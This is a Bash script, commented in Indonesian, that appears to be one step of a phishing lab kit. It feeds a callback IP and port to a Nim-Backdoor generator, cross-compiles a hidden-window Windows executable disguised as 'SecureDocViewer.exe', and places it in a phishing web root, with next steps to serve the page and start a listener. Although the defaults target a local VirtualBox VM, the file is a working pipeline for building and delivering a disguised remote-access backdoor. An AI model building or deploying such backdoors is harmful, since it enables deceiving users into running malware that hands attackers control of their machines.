#!/usr/bin/env bash
# ============================================================
# 02 — Build Nim-Backdoor (cross-compile Windows exe dari CachyOS)
#
# Pakai generator Nim-Backdoor dari koleksi PoC kamu (From-Chruch).
# Output exe (--app=gui, tanpa console) langsung dicopy ke web root phishing.
#
# Jalankan:
#   bash 02-build-backdoor.sh [IP] [PORT] [NAMA_EXE]
#   default: bash 02-build-backdoor.sh 10.0.2.2 4444 SecureDocViewer.exe
#
# IP yang dipakai = IP host CachyOS DARI PERSPEKTIF VM Windows.
# Di VirtualBox NAT default = 10.0.2.2 (gateway NAT).
# Verifikasi dari Windows: ipconfig -> lihat "Default Gateway".
# ============================================================
set -euo pipefail

IP="${1:-10.0.2.2}"
PORT="${2:-4444}"
NAME="${3:-SecureDocViewer.exe}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# --- Lokasi sumber Nim-Backdoor -------------------------------
# Sesuaikan jika perlu: path hasil unzip Nim-Backdoor.zip dari From-Chruch
NIM_SRC="${NIM_SRC:-$HOME/From-Chruch/Nim-Backdoor}"

WORK="$SCRIPT_DIR/.build"

# --- Auto-detect layout web root ------------------------------
#  - Flattened   : index.html di root repo, tanpa 03-phish-server/ → exe di root
#  - Struktur kit: index.html di 03-phish-server/www/           → exe di situ
if [[ -f "$SCRIPT_DIR/index.html" && ! -d "$SCRIPT_DIR/03-phish-server" ]]; then
    PHISH_WWW="$SCRIPT_DIR"
else
    PHISH_WWW="$SCRIPT_DIR/03-phish-server/www"
fi
mkdir -p "$WORK" "$PHISH_WWW"

if [[ ! -f "$NIM_SRC/Nim-Backdoor.py" ]]; then
    echo "[!] Nim-Backdoor.py tidak ditemukan di: $NIM_SRC"
    echo "    Unzip dulu: unzip \"\$HOME/From-Chruch/ZIP/Nim-Backdoor.zip\" -d \"$HOME/From-Chruch/Nim-Backdoor\""
    echo "    Atau set env: NIM_SRC=/path/ke/Nim-Backdoor bash 02-build-backdoor.sh"
    exit 1
fi

echo "[*] IP callback : $IP"
echo "[*] Port        : $PORT"
echo "[*] Output      : $NAME"
echo "[*] Generator   : $NIM_SRC/Nim-Backdoor.py"
echo

cd "$WORK"
# Generator Nim-Backdoor itu interactive (input()) — feed jawabannya via stdin:
#   1) IP   2) Port   3) OS (windows)   4) nama output
printf '%s\n%s\n%s\n%s\n' "$IP" "$PORT" "windows" "$NAME" \
    | python3 "$NIM_SRC/Nim-Backdoor.py"

if [[ ! -f "$WORK/$NAME" ]]; then
    echo
    echo "[!] Compile gagal / exe tidak ditemukan."
    echo "    Kemungkinan nim tidak auto-detect mingw di Arch."
    echo "    program.nim masih ada di $WORK — compile manual:"
    echo
    echo "    cd $WORK"
    echo "    nim c -d=mingw -d=release --app=gui --hints=off --verbosity=0 \\"
    echo "        --gcc.exe=x86_64-w64-mingw32-gcc --gcc.linker=x86_64-w64-mingw32-gcc \\"
    echo "        -o:$NAME program.nim"
    exit 1
fi

cp "$WORK/$NAME" "$PHISH_WWW/$NAME"
echo
echo "[+] Sukses: $WORK/$NAME"
echo "[+] Tercopy ke web root phishing: $PHISH_WWW/$NAME"
echo
echo "    Next step:"
echo "      1. Serve web root (dari direktori yang memuat serve.py):"
echo "         python3 serve.py 8080"
echo "      2. bash 04-listener.sh $PORT"
echo "      3. Dari Windows VM buka: http://10.0.2.2:8080/"
